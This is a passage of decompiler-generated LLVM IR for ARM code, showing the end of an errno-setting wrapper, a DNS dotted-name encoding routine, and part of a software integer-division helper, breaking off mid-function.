  store i32 %v3_1a088, i32* %stack_var_-8, align 4
  %v0_1a094 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a094, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a094, -4095
  br i1 %tmp, label %dec_label_pc_1a0b4, label %dec_label_pc_1a0a4

dec_label_pc_1a0a4:                               ; preds = %entry
  %v0_1a0a4 = call i32 @__GI___errno_location()
  %v0_1a0a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a0a8 = sub i32 0, %v0_1a0a8
  %v2_1a0ac = inttoptr i32 %v0_1a0a4 to i32*
  store i32 %v1_1a0a8, i32* %v2_1a0ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a0b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a0b4

dec_label_pc_1a0b4:                               ; preds = %entry, %dec_label_pc_1a0a4
  %v1_1a0b8 = phi i32 [ %v0_1a094, %entry ], [ -1, %dec_label_pc_1a0a4 ]
  %v2_1a0b4 = phi i32 [ %v3_1a088, %entry ], [ %v2_1a0b4.pre, %dec_label_pc_1a0a4 ]
  store i32 %v2_1a0b4, i32* @r7, align 4
  ret i32 %v1_1a0b8

; uselistorder directives
  uselistorder i32 %v0_1a094, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 51, 50, 35, 48, 47, 46, 45, 85, 84, 83, 20, 40, 34, 58, 82, 81, 78, 49, 33, 57, 56, 80, 79, 77, 76, 75, 74, 5, 42, 60, 17, 9, 73, 8, 23, 7, 16, 15, 14, 44, 43, 72, 71, 70, 41, 13, 12, 67, 22, 32, 31, 59, 11, 26, 29, 61, 28, 55, 54, 53, 69, 38, 37, 6, 2, 4, 39, 66, 10, 68, 0, 52, 3, 24, 65, 25, 30, 64, 63, 62, 19, 1, 18, 36, 27, 21 }
  uselistorder i32* @r7, { 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 151, 152, 153, 154, 155, 156, 157, 158, 165, 166, 167, 168, 169, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 22, 23, 24, 25, 0, 26, 2, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 78, 4, 79, 80, 81, 27, 28, 29, 30, 31, 32, 33, 34, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 82, 1, 83, 84, 85, 86, 5, 170, 171, 120, 6, 121, 122, 123, 124, 125, 126, 35, 36, 41, 42, 43, 44, 37, 38, 39, 40, 45, 46, 47, 48, 271, 272, 76, 77, 241, 242, 232, 233, 49, 234, 230, 231, 274, 275, 276, 281, 282, 7, 17, 18, 273, 50, 51, 3, 52, 15, 53, 54, 243, 244, 249, 250, 251, 252, 253, 254, 255, 245, 246, 247, 248, 159, 160, 161, 162, 163, 164, 256, 257, 258, 259, 260, 261, 262, 263, 8, 264, 265, 266, 217, 218, 267, 268, 226, 227, 69, 70, 221, 222, 16, 223, 9, 224, 225, 87, 88, 89, 90, 91, 92, 93, 10, 177, 178, 172, 11, 173, 174, 175, 14, 176, 55, 12, 56, 57, 179, 13, 180, 181, 94, 95, 100, 101, 19, 20, 96, 97, 98, 99, 102, 103, 104, 105, 148, 149, 150, 235, 236, 279, 280, 58, 59, 269, 270, 106, 107, 277, 278, 228, 229, 60, 61, 219, 220, 62, 63, 64, 65, 66, 67, 68, 237, 238, 239, 240, 71, 72, 73, 74, 75, 21 }
  uselistorder label %dec_label_pc_1a0b4, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1a0bc = load i32, i32* @r4, align 4
  store i32 %v3_1a0bc, i32* %stack_var_-32, align 4
  %v6_1a0bc = load i32, i32* @r5, align 4
  %v9_1a0bc = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1a0c4 = load i32, i32* @r1, align 4
  store i32 %v0_1a0c4, i32* %r8.global-to-local, align 4
  %v0_1a0c8 = load i32, i32* @r2, align 4
  store i32 %v0_1a0c8, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a13023 = icmp slt i8* %arg1, null
  store i1 %v1_1a13023, i1* %cpsr_n.global-to-local, align 1
  %v2_1a13024 = icmp eq i8* %arg1, null
  store i1 %v2_1a13024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a13024, label %dec_label_pc_1a148, label %dec_label_pc_1a13c

dec_label_pc_1a0d4:                               ; preds = %dec_label_pc_1a13c
  %v2_1a0d4 = call i32 @__GI_strchr(i32 %v0_1a0d426, i32 46)
  store i32 %v2_1a0d4, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a0d8 = icmp slt i32 %v2_1a0d4, 0
  store i1 %v1_1a0d8, i1* %cpsr_n.global-to-local, align 1
  %v2_1a0d8 = icmp eq i32 %v2_1a0d4, 0
  store i1 %v2_1a0d8, i1* %cpsr_z.global-to-local, align 1
  %v0_1a0dc = load i32, i32* @r4, align 4
  %v2_1a0dc = sub i32 %v2_1a0d4, %v0_1a0dc
  store i32 %v2_1a0dc, i32* @r5, align 4
  br i1 %v2_1a0d8, label %dec_label_pc_1a0e4, label %dec_label_pc_1a0f0

dec_label_pc_1a0e4:                               ; preds = %dec_label_pc_1a0d4
  %v1_1a0e4 = inttoptr i32 %v0_1a0dc to i8*
  %v3_1a0e8 = call i32 @strlen(i8* %v1_1a0e4)
  %sext = mul i32 %v3_1a0e8, 16777216
  %v1_1a0ec = sdiv i32 %sext, 16777216
  store i32 %v1_1a0ec, i32* @r5, align 4
  %v0_1a0fc.pre = load i32, i32* @r4, align 4
  %v0_1a10c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1a0f0

dec_label_pc_1a0f0:                               ; preds = %dec_label_pc_1a0d4, %dec_label_pc_1a0e4
  %v0_1a10c = phi i32 [ %v2_1a0d4, %dec_label_pc_1a0d4 ], [ %v0_1a10c.pre, %dec_label_pc_1a0e4 ]
  %v0_1a0fc = phi i32 [ %v0_1a0dc, %dec_label_pc_1a0d4 ], [ %v0_1a0fc.pre, %dec_label_pc_1a0e4 ]
  %v0_1a11c = phi i32 [ %v2_1a0dc, %dec_label_pc_1a0d4 ], [ %v1_1a0ec, %dec_label_pc_1a0e4 ]
  %v0_1a0f0 = load i32, i32* %sl.global-to-local, align 4
  %v1_1a0f0 = add i32 %v0_1a0f0, 1
  store i32 %v1_1a0f0, i32* %r7.global-to-local, align 4
  %v1_1a0f4 = load i32, i32* %sb.global-to-local, align 4
  %v2_1a0f4 = sub i32 %v1_1a0f4, %v0_1a0f0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a0f8 = icmp slt i32 %v0_1a11c, 0
  store i1 %v1_1a0f8, i1* %cpsr_n.global-to-local, align 1
  %v2_1a0f8 = icmp eq i32 %v0_1a11c, 0
  store i1 %v2_1a0f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1a0fc, i32* @r1, align 4
  %v0_1a100 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a100 = add i32 %v0_1a100, %v1_1a0f0
  store i32 %v2_1a100, i32* @r0, align 4
  store i32 %v0_1a11c, i32* @r2, align 4
  %v1_1a108 = add i32 %v2_1a0f4, -1
  store i32 %v1_1a108, i32* @r3, align 4
  %v1_1a10c = add i32 %v0_1a10c, 1
  store i32 %v1_1a10c, i32* @r4, align 4
  br i1 %v2_1a0f8, label %dec_label_pc_1a15c, label %dec_label_pc_1a114

dec_label_pc_1a114:                               ; preds = %dec_label_pc_1a0f0
  %v2_1a114 = sub i32 %v0_1a11c, %v1_1a108
  %v3_1a114 = icmp ult i32 %v0_1a11c, %v1_1a108
  %v4_1a114 = xor i32 %v1_1a108, %v0_1a11c
  %v5_1a114 = xor i32 %v2_1a114, %v0_1a11c
  %v6_1a114 = and i32 %v5_1a114, %v4_1a114
  %v7_1a114 = icmp slt i32 %v6_1a114, 0
  store i1 %v7_1a114, i1* %cpsr_v.global-to-local, align 1
  %v8_1a114 = icmp slt i32 %v2_1a114, 0
  store i1 %v8_1a114, i1* %cpsr_n.global-to-local, align 1
  %v9_1a114 = icmp eq i32 %v0_1a11c, %v1_1a108
  store i1 %v9_1a114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a114, label %dec_label_pc_1a11c, label %dec_label_pc_1a15c

dec_label_pc_1a11c:                               ; preds = %dec_label_pc_1a114
  %v1_1a11c = trunc i32 %v0_1a11c to i8
  %v4_1a11c = add i32 %v0_1a100, %v0_1a0f0
  %v5_1a11c = inttoptr i32 %v4_1a11c to i8*
  store i8 %v1_1a11c, i8* %v5_1a11c, align 1
  %v0_1a120 = call i32 @memcpy()
  store i32 %v0_1a120, i32* @r0, align 4
  %v0_1a124 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a124 = icmp slt i32 %v0_1a124, 0
  store i1 %v1_1a124, i1* %cpsr_n.global-to-local, align 1
  %v2_1a124 = icmp eq i32 %v0_1a124, 0
  store i1 %v2_1a124, i1* %cpsr_z.global-to-local, align 1
  %v0_1a128 = load i32, i32* @r5, align 4
  %v1_1a128 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a128 = add i32 %v1_1a128, %v0_1a128
  store i32 %v2_1a128, i32* %sl.global-to-local, align 4
  br i1 %v2_1a124, label %dec_label_pc_1a148, label %dec_label_pc_1a11c.dec_label_pc_1a130_crit_edge

dec_label_pc_1a11c.dec_label_pc_1a130_crit_edge:  ; preds = %dec_label_pc_1a11c
  %v0_1a130.pre = load i32, i32* @r4, align 4
  store i32 %v0_1a130.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a130 = icmp slt i32 %v0_1a130.pre, 0
  store i1 %v1_1a130, i1* %cpsr_n.global-to-local, align 1
  %v2_1a130 = icmp eq i32 %v0_1a130.pre, 0
  store i1 %v2_1a130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a130, label %dec_label_pc_1a148, label %dec_label_pc_1a13c

dec_label_pc_1a13c:                               ; preds = %entry, %dec_label_pc_1a11c.dec_label_pc_1a130_crit_edge
  %v0_1a0d426 = phi i32 [ %v0_1a130.pre, %dec_label_pc_1a11c.dec_label_pc_1a130_crit_edge ], [ %tmp, %entry ]
  %v5_1a150525 = phi i32 [ %v2_1a128, %dec_label_pc_1a11c.dec_label_pc_1a130_crit_edge ], [ 0, %entry ]
  %v1_1a13c = inttoptr i32 %v0_1a0d426 to i8*
  %v2_1a13c = load i8, i8* %v1_1a13c, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a140 = icmp eq i8 %v2_1a13c, 0
  store i1 %v2_1a140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a140, label %dec_label_pc_1a148, label %dec_label_pc_1a0d4

dec_label_pc_1a148:                               ; preds = %dec_label_pc_1a11c.dec_label_pc_1a130_crit_edge, %dec_label_pc_1a11c, %dec_label_pc_1a13c, %entry
  %v8_1a154 = phi i32 [ 0, %entry ], [ %v5_1a150525, %dec_label_pc_1a13c ], [ %v2_1a128, %dec_label_pc_1a11c ], [ %v2_1a128, %dec_label_pc_1a11c.dec_label_pc_1a130_crit_edge ]
  %v0_1a148 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1a148 = icmp slt i32 %v0_1a148, 0
  store i1 %v1_1a148, i1* %cpsr_n.global-to-local, align 1
  %v2_1a148 = icmp eq i32 %v0_1a148, 0
  store i1 %v2_1a148, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1a148, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1a148
  %v6_1a150 = add i32 %v8_1a154, 1
  store i32 %v6_1a150, i32* @r0, align 4
  %v7_1a154 = load i32, i32* %r8.global-to-local, align 4
  %v9_1a154 = add i32 %v7_1a154, %v8_1a154
  %v10_1a154 = inttoptr i32 %v9_1a154 to i8*
  store i8 0, i8* %v10_1a154, align 1
  %v0_1a158.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1a158.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1a158.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1a148, %bb
  %v2_1a158 = phi i1 [ %v2_1a158.pre, %bb ], [ false, %dec_label_pc_1a148 ]
  %v1_1a158 = phi i1 [ %v1_1a158.pre, %bb ], [ %v1_1a148, %dec_label_pc_1a148 ]
  %v0_1a158 = phi i1 [ %v0_1a158.pre, %bb ], [ %v2_1a148, %dec_label_pc_1a148 ]
  %v3_1a158 = xor i1 %v2_1a158, %v1_1a158
  %v4_1a158 = or i1 %v0_1a158, %v3_1a158
  br i1 %v4_1a158, label %dec_label_pc_1a15c, label %.dec_label_pc_1a160_crit_edge

.dec_label_pc_1a160_crit_edge:                    ; preds = %bb22
  %v1_1a164.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1a160

dec_label_pc_1a15c:                               ; preds = %dec_label_pc_1a114, %dec_label_pc_1a0f0, %bb22
  br label %dec_label_pc_1a160

dec_label_pc_1a160:                               ; preds = %.dec_label_pc_1a160_crit_edge, %dec_label_pc_1a15c
  %v1_1a164 = phi i32 [ %v1_1a164.pre, %.dec_label_pc_1a160_crit_edge ], [ -1, %dec_label_pc_1a15c ]
  %v2_1a160 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1a160, i32* @r4, align 4
  store i32 %v6_1a0bc, i32* @r5, align 4
  store i32 %v9_1a0bc, i32* @r6, align 4
  ret i32 %v1_1a164

; uselistorder directives
  uselistorder i32 %v0_1a148, { 0, 2, 1 }
  uselistorder i32 %v0_1a130.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1a124, { 1, 0 }
  uselistorder i32 %v2_1a114, { 1, 0 }
  uselistorder i32 %v1_1a108, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1a11c, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1a0ec, { 1, 0 }
  uselistorder i1 %v2_1a13024, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i8 0, { 8, 47, 1, 2, 49, 48, 50, 3, 51, 30, 52, 10, 11, 53, 4, 54, 55, 57, 56, 33, 58, 34, 12, 60, 59, 13, 14, 15, 16, 17, 62, 61, 35, 63, 5, 64, 65, 66, 31, 32, 68, 69, 67, 71, 70, 36, 72, 18, 73, 74, 19, 75, 6, 76, 45, 77, 20, 21, 22, 23, 24, 25, 78, 79, 80, 81, 82, 37, 84, 85, 86, 87, 83, 26, 27, 0, 88, 89, 90, 28, 9, 92, 91, 29, 93, 94, 95, 38, 96, 97, 7, 98, 100, 39, 101, 102, 99, 103, 104, 105, 106, 108, 107, 109, 110, 111, 112, 113, 115, 114, 116, 40, 118, 117, 46, 119, 41, 120, 122, 123, 121, 42, 124, 125, 44, 126, 43, 127, 128, 129, 130, 131 }
  uselistorder i32 ()* @memcpy, { 16, 15, 14, 9, 8, 7, 3, 2, 1, 23, 6, 11, 22, 21, 0, 13, 12, 20, 19, 18, 10, 17, 5, 4 }
  uselistorder i32 (i8*)* @strlen, { 12, 10, 9, 8, 7, 5, 26, 25, 11, 16, 15, 14, 27, 24, 23, 22, 20, 21, 19, 18, 17, 13, 29, 28, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 9, 5, 4, 3, 1, 2, 0, 8, 7, 6, 15, 14, 13, 12, 11, 10 }
  uselistorder label %dec_label_pc_1a160, { 1, 0 }
  uselistorder label %dec_label_pc_1a15c, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1a148, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a13c, { 1, 0 }
  uselistorder label %dec_label_pc_1a0f0, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1a168 = load i32, i32* @r1, align 4
  %v1_1a168 = icmp slt i32 %v0_1a168, 0
  %v2_1a168 = icmp eq i32 %v0_1a168, 0
  %v2_1a16c = xor i32 %v0_1a168, %arg1
  br i1 %v2_1a168, label %dec_label_pc_1a280, label %dec_label_pc_1a174

dec_label_pc_1a174:                               ; preds = %entry
  br i1 %v1_1a168, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1a174
  %v2_1a174 = sub i32 0, %v0_1a168
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1a174, %bb
  %v1_1a240 = phi i32 [ %v2_1a174, %bb ], [ %v0_1a168, %dec_label_pc_1a174 ]
  %v1_1a178 = add i32 %v1_1a240, -1
  %v7_1a178 = icmp eq i32 %v1_1a240, 1
  br i1 %v7_1a178, label %dec_label_pc_1a220, label %dec_label_pc_1a180

dec_label_pc_1a180:                               ; preds = %thread-pre-split
  %v1_1a180 = icmp slt i32 %arg1, 0
  br i1 %v1_1a180, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1a180
  %v2_1a184 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1a180, %bb85
  %v0_1a274 = phi i32 [ %arg1, %dec_label_pc_1a180 ], [ %v2_1a184, %bb85 ]
  %v3_1a188 = icmp uge i32 %v0_1a274, %v1_1a240
  %v9_1a188 = icmp eq i32 %v0_1a274, %v1_1a240
  %v2_1a18c = xor i1 %v3_1a188, true
  %v3_1a18c = or i1 %v9_1a188, %v2_1a18c
  br i1 %v3_1a18c, label %dec_label_pc_1a22c, label %dec_label_pc_1a190

dec_label_pc_1a190:                               ; preds = %bb86
  %v2_1a190 = and i32 %v1_1a178, %v1_1a240
  %v4_1a190 = icmp eq i32 %v2_1a190, 0
  br i1 %v4_1a190, label %dec_label_pc_1a23c, label %dec_label_pc_1a198

dec_label_pc_1a198:                               ; preds = %dec_label_pc_1a190
  %v3_1a198 = icmp ult i32 %v1_1a240, 536870912
  br i1 %v3_1a198, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1a198
  %v4_1a19c = mul i32 %v1_1a240, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1a198, %.thread
  %v0_1a1bc.pr40.ph = phi i32 [ %v4_1a19c, %.thread ], [ %v1_1a240, %dec_label_pc_1a198 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1a198 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1a1bc.pr40 = phi i32 [ %v4_1a1b0, %bb89 ], [ %v0_1a1bc.pr40.ph, %.preheader.preheader ]
  %v1_1a1b4 = phi i32 [ %v4_1a1b4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1a1a8 = icmp ugt i32 %v0_1a1bc.pr40, 268435455
  br i1 %v2_1a1a8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1a1bcthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1a1ac = icmp ult i32 %v0_1a1bc.pr40, %v0_1a274
  br i1 %v4_1a1ac, label %bb88, label %dec_label_pc_1a1bcthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1a1b0 = and i32 %v0_1a1bc.pr40, 268435456
  %v3_1a1b0 = icmp eq i32 %v2_1a1b0, 0
  %v4_1a1b0 = mul i32 %v0_1a1bc.pr40, 16
  br i1 %v3_1a1b0, label %bb89, label %dec_label_pc_1a1bc.loopexit

bb89:                                             ; preds = %bb88
  %v2_1a1b4 = and i32 %v1_1a1b4, 268435456
  %v3_1a1b4 = icmp eq i32 %v2_1a1b4, 0
  %v4_1a1b4 = mul i32 %v1_1a1b4, 16
  br i1 %v3_1a1b4, label %.preheader, label %dec_label_pc_1a1bcthread-pre-split.loopexit.loopexit

dec_label_pc_1a1bcthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1a1c852.ph = phi i32 [ %v1_1a1b4, %bb87 ], [ %v4_1a1b4, %bb89 ]
  %v0_1a1bc.pr42.ph = phi i32 [ %v0_1a1bc.pr40, %bb87 ], [ %v4_1a1b0, %bb89 ]
  br label %dec_label_pc_1a1bcthread-pre-split.loopexit

dec_label_pc_1a1bcthread-pre-split.loopexit:      ; preds = %dec_label_pc_1a1bcthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1a1c852 = phi i32 [ %v1_1a1b4, %.thread3 ], [ %v1_1a1c852.ph, %dec_label_pc_1a1bcthread-pre-split.loopexit.loopexit ]
  %v0_1a1bc.pr42 = phi i32 [ %v0_1a1bc.pr40, %.thread3 ], [ %v0_1a1bc.pr42.ph, %dec_label_pc_1a1bcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1a1bcthread-pre-split

dec_label_pc_1a1bcthread-pre-split:               ; preds = %dec_label_pc_1a1bcthread-pre-split.loopexit, %bb91
  %v1_1a1c850 = phi i32 [ %v1_1a1c852, %dec_label_pc_1a1bcthread-pre-split.loopexit ], [ %v3_1a1c8, %bb91 ]
  %v2_1a1c048 = phi i32 [ %v0_1a274, %dec_label_pc_1a1bcthread-pre-split.loopexit ], [ %v2_1a1c0, %bb91 ]
  %v0_1a1bc.pr = phi i32 [ %v0_1a1bc.pr42, %dec_label_pc_1a1bcthread-pre-split.loopexit ], [ %v3_1a1c4, %bb91 ]
  br label %dec_label_pc_1a1bc

dec_label_pc_1a1bc.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1a1bc

dec_label_pc_1a1bc:                               ; preds = %dec_label_pc_1a1bc.loopexit, %dec_label_pc_1a1bcthread-pre-split
  %v1_1a1c8 = phi i32 [ %v1_1a1c850, %dec_label_pc_1a1bcthread-pre-split ], [ %v1_1a1b4, %dec_label_pc_1a1bc.loopexit ]
  %v2_1a1c0 = phi i32 [ %v2_1a1c048, %dec_label_pc_1a1bcthread-pre-split ], [ %v0_1a274, %dec_label_pc_1a1bc.loopexit ]
  %v1_1a1c4 = phi i32 [ %v0_1a1bc.pr, %dec_label_pc_1a1bcthread-pre-split ], [ %v4_1a1b0, %dec_label_pc_1a1bc.loopexit ]
  %v2_1a1bc = icmp slt i32 %v1_1a1c4, 0
  br i1 %v2_1a1bc, label %dec_label_pc_1a1d0, label %bb90

bb90:                                             ; preds = %dec_label_pc_1a1bc
  %v4_1a1c0 = icmp ult i32 %v1_1a1c4, %v2_1a1c0
  br i1 %v4_1a1c0, label %bb91, label %dec_label_pc_1a1d0

bb91:                                             ; preds = %bb90
  %v3_1a1c4 = mul i32 %v1_1a1c4, 2
  %v2_1a1c8 = icmp slt i32 %v1_1a1c8, 0
  %v3_1a1c8 = mul i32 %v1_1a1c8, 2
  br i1 %v2_1a1c8, label %dec_label_pc_1a1d0, label %dec_label_pc_1a1bcthread-pre-split

dec_label_pc_1a1d0:                               ; preds = %bb90, %dec_label_pc_1a1bc, %bb91
  %v2_1a1dc63 = phi i32 [ %v3_1a1c8, %bb91 ], [ %v1_1a1c8, %bb90 ], [ %v1_1a1c8, %dec_label_pc_1a1bc ]
  %v1_1a1d455 = phi i32 [ %v3_1a1c4, %bb91 ], [ %v1_1a1c4, %bb90 ], [ %v1_1a1c4, %dec_label_pc_1a1bc ]
  br label %dec_label_pc_1a1d4

dec_label_pc_1a1d4:                               ; preds = %.thread13, %dec_label_pc_1a1d0
  %v1_1a208 = phi i32 [ %v4_1a208, %.thread13 ], [ %v2_1a1dc63, %dec_label_pc_1a1d0 ]
  %v1_1a1dc = phi i32 [ %v1_1a218, %.thread13 ], [ 0, %dec_label_pc_1a1d0 ]
  %v1_1a20c = phi i32 [ %v4_1a20c, %.thread13 ], [ %v1_1a1d455, %dec_label_pc_1a1d0 ]
  %v1_1a1d8 = phi i32 [ %v0_1a204, %.thread13 ], [ %v0_1a274, %dec_label_pc_1a1d0 ]
  %v3_1a1d4 = icmp ult i32 %v1_1a1d8, %v1_1a20c
  br i1 %v3_1a1d4, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1a1d4
  %v3_1a1d8 = sub i32 %v1_1a1d8, %v1_1a20c
  %v3_1a1dc = or i32 %v1_1a1dc, %v1_1a208
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a1d4, %bb92
  %v1_1a1e4 = phi i32 [ %v1_1a1d8, %dec_label_pc_1a1d4 ], [ %v3_1a1d8, %bb92 ]
  %v1_1a1e8 = phi i32 [ %v1_1a1dc, %dec_label_pc_1a1d4 ], [ %v3_1a1dc, %bb92 ]
  %v4_1a1e0 = udiv i32 %v1_1a20c, 2
  %v6_1a1e0 = icmp ult i32 %v1_1a1e4, %v4_1a1e0
  br i1 %v6_1a1e0, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1a1e4 = urem i32 %v1_1a20c, 2
  %v4_1a1e4 = icmp eq i32 %v3_1a1e4, 0
  %v6_1a1e4 = sub i32 %v1_1a1e4, %v4_1a1e0
  br i1 %v4_1a1e4, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1a1e8 = udiv i32 %v1_1a208, 2
  %v6_1a1e8 = or i32 %v1_1a1e8, %v5_1a1e8
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1a1f0 = phi i32 [ %v6_1a1e4, %bb93 ], [ %v1_1a1e4, %.thread8 ], [ %v6_1a1e4, %bb94 ]
  %v1_1a1f4 = phi i32 [ %v1_1a1e8, %bb93 ], [ %v1_1a1e8, %.thread8 ], [ %v6_1a1e8, %bb94 ]
  %v4_1a1ec = udiv i32 %v1_1a20c, 4
  %v6_1a1ec = icmp ult i32 %v1_1a1f0, %v4_1a1ec
  br i1 %v6_1a1ec, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1a1f0 = and i32 %v1_1a20c, 2
  %v4_1a1f0 = icmp eq i32 %v3_1a1f0, 0
  %v6_1a1f0 = sub i32 %v1_1a1f0, %v4_1a1ec
  br i1 %v4_1a1f0, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1a1f4 = udiv i32 %v1_1a208, 4
  %v6_1a1f4 = or i32 %v1_1a1f4, %v5_1a1f4
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1a1fc = phi i32 [ %v6_1a1f0, %bb95 ], [ %v1_1a1f0, %.thread9 ], [ %v6_1a1f0, %bb96 ]
  %v1_1a200 = phi i32 [ %v1_1a1f4, %bb95 ], [ %v1_1a1f4, %.thread9 ], [ %v6_1a1f4, %bb96 ]
  %v4_1a1f8 = udiv i32 %v1_1a20c, 8
  %v6_1a1f8 = icmp ult i32 %v1_1a1fc, %v4_1a1f8
  br i1 %v6_1a1f8, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1a1fc = and i32 %v1_1a20c, 4
  %v4_1a1fc = icmp eq i32 %v3_1a1fc, 0
  %v6_1a1fc = sub i32 %v1_1a1fc, %v4_1a1f8
  br i1 %v4_1a1fc, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1a200 = udiv i32 %v1_1a208, 8
  %v6_1a200 = or i32 %v1_1a200, %v5_1a200
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1a218 = phi i32 [ %v1_1a200, %bb97 ], [ %v1_1a200, %.thread10 ], [ %v6_1a200, %bb98 ]
  %v0_1a204 = phi i32 [ %v6_1a1fc, %bb97 ], [ %v1_1a1fc, %.thread10 ], [ %v6_1a1fc, %bb98 ]
  %v2_1a204 = icmp eq i32 %v0_1a204, 0
  br i1 %v2_1a204, label %dec_label_pc_1a214, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1a208, 16
  br i1 %tmp, label %dec_label_pc_1a214, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1a208 = udiv i32 %v1_1a208, 16
  %v4_1a20c = udiv i32 %v1_1a20c, 16
  br label %dec_label_pc_1a1d4

dec_label_pc_1a214:                               ; preds = %thread-pre-split12, %bb99
  %v1_1a214 = icmp slt i32 %v2_1a16c, 0
  br i1 %v1_1a214, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1a214
  %v2_1a218 = sub i32 0, %v1_1a218
  br label %.thread16

